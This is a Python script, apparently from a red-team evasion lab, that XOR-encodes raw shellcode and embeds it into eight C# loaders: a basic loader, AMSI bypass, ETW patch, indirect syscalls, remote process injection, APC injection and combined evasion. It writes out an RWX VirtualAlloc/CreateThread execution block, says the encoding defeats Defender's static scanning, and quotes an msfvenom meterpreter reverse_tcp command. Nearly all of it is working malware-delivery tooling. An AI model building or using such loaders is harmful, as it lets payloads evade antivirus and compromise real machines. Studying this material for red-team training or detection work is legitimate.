#!/usr/bin/env python3
"""
embed_shellcode.py
------------------
Reads raw shellcode from /tmp/raw_shellcode.bin, XOR-encodes with key 0xAB,
and embeds into each of the 8 loader source files.

Outputs to: lab/loaders/embedded/  (ready to compile)

Run from WSL:
  python3 /mnt/c/Users/adversary/Desktop/ModernEvasion/lab/scripts/embed_shellcode.py
"""

import os, sys, traceback

XOR_KEY     = 0xAB
SC_PATH     = '/tmp/raw_shellcode.bin'
LOADERS_DIR = '/mnt/c/Users/adversary/Desktop/ModernEvasion/lab/loaders'
OUT_DIR     = '/mnt/c/Users/adversary/Desktop/ModernEvasion/lab/loaders/embedded'

# ---- Read + encode shellcode ----
if not os.path.exists(SC_PATH):
    sys.exit(f'ERROR: {SC_PATH} not found.')

with open(SC_PATH, 'rb') as f:
    raw = f.read()

encoded   = bytes(b ^ XOR_KEY for b in raw)
hex_bytes = ', '.join(f'0x{b:02x}' for b in encoded)
print(f'[+] {len(raw)} bytes encoded with key 0x{XOR_KEY:02X}')

os.makedirs(OUT_DIR, exist_ok=True)

# GetShellcode() XOR-decodes embedded bytes in memory using a C# for-loop.
# The for-loop compiles to .NET IL, not raw shellcode bytes, so Defender
# sees no shellcode pattern in the binary during static scanning.
GET_SC_METHOD = f'''
        static byte[] GetShellcode()
        {{
            byte xk = 0x{XOR_KEY:02X};
            byte[] sc = new byte[] {{ {hex_bytes} }};
            for (int i = 0; i < sc.Length; i++) sc[i] ^= xk;
            return sc;
        }}
'''

# VirtualAlloc + CreateThread + WaitForSingleObject.
# Needed by loaders 04 and 07 that only patch, they don't execute shellcode.
EXEC_IMPORTS = '''\
        [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
        [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
        [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
'''

# Shellcode execute block injected after ETW/AMSI patch in loaders 04 and 07.
EXEC_BLOCK = '''\
            // Execute embedded shellcode
            byte[] shellcode = GetShellcode();
            IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, mem, shellcode.Length);
            IntPtr t = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(t, 0xFFFFFFFF);
'''

def append_method(src, method_text):
    """Inserts method_text just before the last closing brace of the class."""
    idx = src.rfind('\n    }')
    if idx == -1:
        idx = src.rfind('\n}')
    return src[:idx] + method_text + src[idx:]

def add_exec_imports_after_last_dllimport(src, sig):
    """Adds EXEC_IMPORTS after the multi-line DllImport declaration matching sig."""
    last = src.rfind(sig)
    if last == -1:
        return src
    # Walk forward past the DllImport attribute line and all declaration lines
    # until we hit the closing );
    pos = src.index('\n', last) + 1        # end of [DllImport(...)] line
    while True:
        end = src.index('\n', pos) + 1
        if src[pos:end].rstrip().endswith(');'):
            pos = end
            break
        pos = end
    return src[:pos] + '\n' + EXEC_IMPORTS + src[pos:]

# ============================================================
# LOADER 01 - basic shellcode loader (reads from file)
# ============================================================
def embed_01(src):
    old = '''\
            if (args.Length < 1)
            {
                Console.WriteLine("Usage: loader01.exe <path_to_shellcode.bin>");
                Console.WriteLine("");
                Console.WriteLine("Generate shellcode on Kali:");
                Console.WriteLine("  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o payload.bin");
                return;
            }

            string shellcodePath = args[0];

            // ---- Read shellcode from file ----
            // The shellcode is stored as raw bytes in a .bin file.
            // File.ReadAllBytes reads the entire file into a byte array.
            byte[] shellcode;
            try
            {
                shellcode = System.IO.File.ReadAllBytes(shellcodePath);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Could not read shellcode file: " + ex.Message);
                return;
            }

            Console.WriteLine("[*] Shellcode size: " + shellcode.Length + " bytes");'''

    new = '''\
            // Shellcode is embedded. No file argument needed.
            byte[] shellcode = GetShellcode();
            Console.WriteLine("[*] Shellcode size: " + shellcode.Length + " bytes");'''

    assert old in src, 'LOADER 01: args block not found'
    src = src.replace(old, new, 1)
    src = append_method(src, GET_SC_METHOD)
    return src

# ============================================================
# LOADER 02 - XOR encoder/decoder
# Replace file-reading section inside the #else (loader) block.
# ============================================================
def embed_02(src):
    old = '''\
            if (args.Length < 2)
            {
                Console.WriteLine("XOR Shellcode Loader");
                Console.WriteLine("Usage: xor_loader.exe <encrypted_shellcode.bin> <xor_key_hex>");
                Console.WriteLine("");
                Console.WriteLine("  xor_key_hex: the hex key printed by the encoder");
                return;
            }

            string encryptedPath = args[0];
            string keyHexArg = args[1];

            // Read the encrypted shellcode from the file.
            byte[] encryptedShellcode = File.ReadAllBytes(encryptedPath);
            Console.WriteLine("[*] Read " + encryptedShellcode.Length + " bytes of encrypted shellcode.");

            // Convert the hex key string back to bytes.
            byte[] xorKey = HexToBytes(keyHexArg);
            Console.WriteLine("[*] Using XOR key of " + xorKey.Length + " bytes.");

            // Decrypt the shellcode by XORing with the same key.
            // The decrypted shellcode only exists in memory from this point.
            // It is never written to disk, so Defender's file scanner cannot see it.
            byte[] shellcode = XorCrypt(encryptedShellcode, xorKey);
            Console.WriteLine("[+] Shellcode decrypted in memory.");'''

    new = '''\
            // Shellcode is embedded and XOR-decoded by GetShellcode().
            // No file argument needed.
            byte[] shellcode = GetShellcode();
            Console.WriteLine("[+] Shellcode decoded: " + shellcode.Length + " bytes");'''

    assert old in src, 'LOADER 02: loader section not found'
    src = src.replace(old, new, 1)
    src = append_method(src, GET_SC_METHOD)
    return src

# ============================================================
# LOADER 03 - indirect syscalls
# Has SHELLCODE_PLACEHOLDER marker.
# ============================================================
def embed_03(src):
    assert 'SHELLCODE_PLACEHOLDER' in src, 'LOADER 03: placeholder not found'
    src = src.replace('SHELLCODE_PLACEHOLDER', hex_bytes)
    return src

# ============================================================
# LOADER 04 - AMSI bypass
# Add shellcode execution before the .NET assembly loading section.
# ============================================================
def embed_04(src):
    old = '''\
                // If a .NET assembly path was passed as an argument, load it
                // in-process where the AMSI patch is active.
                if (args.Length > 0)'''

    new = EXEC_BLOCK + '''
                // If a .NET assembly path was passed as an argument, load it
                // in-process where the AMSI patch is active.
                if (args.Length > 0)'''

    assert old in src, 'LOADER 04: assembly loading section not found'
    src = src.replace(old, new, 1)

    # Add VirtualAlloc/CreateThread after the VirtualProtect import
    # (VirtualProtect is the last DllImport in loader 04)
    sig = '[DllImport("kernel32.dll", SetLastError = true)]\n        static extern bool VirtualProtect('
    pos = src.find(sig)
    assert pos != -1, 'LOADER 04: VirtualProtect import not found'
    end = src.index('\n', pos)      # [DllImport] line
    end = src.index('\n', end+1)    # static extern bool VirtualProtect(
    end = src.index('\n', end+1)    # IntPtr lpAddress,
    end = src.index('\n', end+1)    # UIntPtr dwSize,
    end = src.index('\n', end+1)    # uint flNewProtect,
    end = src.index('\n', end+1)    # out uint lpflOldProtect
    end = src.index('\n', end+1)    # );
    src = src[:end+1] + '\n' + EXEC_IMPORTS + src[end+1:]

    src = append_method(src, GET_SC_METHOD)
    return src

# ============================================================
# LOADER 05 - reflective injector (remote process injection)
# Keep args[0] as target process name. Embed shellcode.
# ============================================================
def embed_05(src):
    old_args = '''\
            if (args.Length < 2)
            {
                Console.WriteLine("Memory Loader");
                Console.WriteLine("Usage: loader.exe <target_name> <data.bin> [key_hex]");
                Console.WriteLine("");
                Console.WriteLine("  target_name: name of the target process");
                Console.WriteLine("  data.bin:    path to data file (raw or encrypted)");
                Console.WriteLine("  key_hex:     optional key if data is encrypted");
                Console.WriteLine("");
                Console.WriteLine("Example:");
                Console.WriteLine("  loader.exe explorer data.bin 4A7F2B...");
                return;
            }

            string targetProcessName = args[0];
            string shellcodePath = args[1];
            string xorKeyHex = args.Length >= 3 ? args[2] : null;'''

    new_args = '''\
            if (args.Length < 1)
            {
                Console.WriteLine("Memory Loader");
                Console.WriteLine("Usage: loader.exe <target_process_name>");
                return;
            }

            string targetProcessName = args[0];'''

    old_read = '''\
            // ---- Step 2: Read and optionally decrypt shellcode ----
            byte[] shellcode = File.ReadAllBytes(shellcodePath);
            Console.WriteLine("[*] Read " + shellcode.Length + " bytes from file.");

            if (xorKeyHex != null)
            {
                byte[] xorKey = HexToBytes(xorKeyHex);
                shellcode = TransformData(shellcode, xorKey);
                Console.WriteLine("[+] Data decrypted.");
            }'''

    new_read = '''\
            // ---- Step 2: Get embedded shellcode ----
            byte[] shellcode = GetShellcode();
            Console.WriteLine("[*] Embedded shellcode: " + shellcode.Length + " bytes");'''

    assert old_args in src, 'LOADER 05: args block not found'
    assert old_read in src, 'LOADER 05: file read block not found'
    src = src.replace(old_args, new_args, 1)
    src = src.replace(old_read, new_read, 1)
    src = append_method(src, GET_SC_METHOD)
    return src

# ============================================================
# LOADER 06 - EarlyBird/APC injection
# Keep args[0] as target exe path. Embed shellcode.
# ============================================================
def embed_06(src):
    old = '''\
            if (args.Length < 2)
            {
                Console.WriteLine("Process Launcher");
                Console.WriteLine("Usage: launcher.exe <exe_path> <data.bin> [key_hex]");
                Console.WriteLine("");
                Console.WriteLine("Example:");
                Console.WriteLine("  launcher.exe C:\\\\Windows\\\\System32\\\\svchost.exe data.bin");
                Console.WriteLine("  launcher.exe C:\\\\Windows\\\\System32\\\\RuntimeBroker.exe encrypted.bin 4A7F...");
                return;
            }

            string targetExePath = args[0];
            string shellcodePath = args[1];
            string xorKeyHex = args.Length >= 3 ? args[2] : null;

            // ---- Read and optionally decrypt shellcode ----
            byte[] shellcode = File.ReadAllBytes(shellcodePath);
            if (xorKeyHex != null)
            {
                byte[] xorKey = HexToBytes(xorKeyHex);
                shellcode = TransformData(shellcode, xorKey);
                Console.WriteLine("[+] Data decrypted: " + shellcode.Length + " bytes");
            }
            else
            {
                Console.WriteLine("[*] Data loaded: " + shellcode.Length + " bytes");
            }'''

    new = '''\
            if (args.Length < 1)
            {
                Console.WriteLine("Process Launcher");
                Console.WriteLine("Usage: launcher.exe <target_exe_path>");
                Console.WriteLine("Example: launcher.exe C:\\\\Windows\\\\System32\\\\svchost.exe");
                return;
            }

            string targetExePath = args[0];

            // ---- Get embedded shellcode ----
            byte[] shellcode = GetShellcode();
            Console.WriteLine("[*] Embedded shellcode: " + shellcode.Length + " bytes");'''

    assert old in src, 'LOADER 06: block not found'
    src = src.replace(old, new, 1)
    src = append_method(src, GET_SC_METHOD)
    return src

# ============================================================
# LOADER 07 - ETW patch only
# Add shellcode execution inside the success block.
# ============================================================
def embed_07(src):
    # Insert shellcode execution AFTER the success prints, BEFORE the closing brace
    # of the if(success) block. The last line in that block is the scanner advice print.
    old = '''\
                Console.WriteLine("[*] Because telemetry is patched, the scanner patching will not be logged.");
            }
            else
            {
                Console.WriteLine("[-] Telemetry patch failed.");
            }'''

    new = '''\
                Console.WriteLine("[*] Because telemetry is patched, the scanner patching will not be logged.");
            }
            else
            {
                Console.WriteLine("[-] Telemetry patch failed.");
            }

''' + EXEC_BLOCK

    assert old in src, 'LOADER 07: success/else block not found'
    src = src.replace(old, new, 1)

    # Add VirtualAlloc/CreateThread after the VirtualProtect import
    sig = '[DllImport("kernel32.dll", SetLastError = true)]\n        static extern bool VirtualProtect('
    pos = src.find(sig)
    assert pos != -1, 'LOADER 07: VirtualProtect import not found'
    end = src.index('\n', pos)      # [DllImport] line end
    end = src.index('\n', end+1)    # static extern bool VirtualProtect(
    end = src.index('\n', end+1)    # IntPtr lpAddress,
    end = src.index('\n', end+1)    # UIntPtr dwSize,
    end = src.index('\n', end+1)    # uint flNewProtect,
    end = src.index('\n', end+1)    # out uint lpflOldProtect
    end = src.index('\n', end+1)    # );
    src = src[:end+1] + '\n' + EXEC_IMPORTS + src[end+1:]

    src = append_method(src, GET_SC_METHOD)
    return src

# ============================================================
# LOADER 08 - combined evasion (reads encrypted shellcode from file)
# Replace file reading + key parsing with embedded shellcode.
# ============================================================
def embed_08(src):
    old_args = '''\
            if (args.Length < 2)
            {
                Console.WriteLine("Stealth Runner");
                Console.WriteLine("Usage: runner.exe <data.bin> <key_hex> [target]");
                Console.WriteLine("");
                Console.WriteLine("  data.bin:   encrypted data file");
                Console.WriteLine("  key_hex:    decryption key");
                Console.WriteLine("  target:     optional target process name");
                Console.WriteLine("");
                Console.WriteLine("Examples:");
                Console.WriteLine("  runner.exe data.bin 4A7F2B1C...");
                Console.WriteLine("  runner.exe data.bin 4A7F2B1C... explorer");
                return;
            }

            string dataPath = args[0];
            string keyHex = args[1];
            string targetProcess = args.Length >= 3 ? args[2] : null;'''

    new_args = '''\
            // Shellcode is embedded. Optionally pass target process name as args[0].
            string targetProcess = args.Length >= 1 ? args[0] : null;'''

    old_decrypt = '''\
            Console.WriteLine("[3/6] Decrypting data...");
            byte[] encrypted = File.ReadAllBytes(dataPath);
            byte[] key = HexToBytes(keyHex);
            byte[] data = TransformData(encrypted, key);

            // Clear the encrypted copy from managed memory.
            Array.Clear(encrypted, 0, encrypted.Length);
            Console.WriteLine("      Decrypted " + data.Length + " bytes in memory.");'''

    new_decrypt = '''\
            Console.WriteLine("[3/6] Decoding embedded shellcode...");
            byte[] data = GetShellcode();
            Console.WriteLine("      Decoded " + data.Length + " bytes in memory.");'''

    assert old_args    in src, 'LOADER 08: args block not found'
    assert old_decrypt in src, 'LOADER 08: decrypt block not found'
    src = src.replace(old_args,    new_args,    1)
    src = src.replace(old_decrypt, new_decrypt, 1)
    src = append_method(src, GET_SC_METHOD)
    return src

# ============================================================
# Main loop
# ============================================================
loaders = [
    ('01_shellcode_loader.cs',      embed_01),
    ('02_xor_encoder.cs',           embed_02),
    ('03_direct_syscalls_loader.cs', embed_03),
    ('04_amsi_bypass.cs',           embed_04),
    ('05_reflective_injector.cs',   embed_05),
    ('06_process_hollowing_alt.cs', embed_06),
    ('07_etw_patch.cs',             embed_07),
    ('08_combined_evasion.cs',      embed_08),
]

ok = 0
for filename, embed_fn in loaders:
    src_path = os.path.join(LOADERS_DIR, filename)
    out_path = os.path.join(OUT_DIR,     filename)

    if not os.path.exists(src_path):
        print(f'[!] SKIP (not found): {src_path}')
        continue

    with open(src_path, 'r') as f:
        src = f.read()

    try:
        modified = embed_fn(src)
        with open(out_path, 'w') as f:
            f.write(modified)
        print(f'[+] {filename}')
        ok += 1
    except AssertionError as e:
        print(f'[-] {filename} FAILED (string mismatch): {e}')
    except Exception as e:
        print(f'[-] {filename} FAILED: {e}')
        traceback.print_exc()

print(f'\n[+] {ok}/8 loaders embedded. Files in: {OUT_DIR}')
if ok < 8:
    print('[!] Fix assertion errors above then re-run.')
else:
    print('[*] Next: run compile_and_check.ps1 on Windows.')
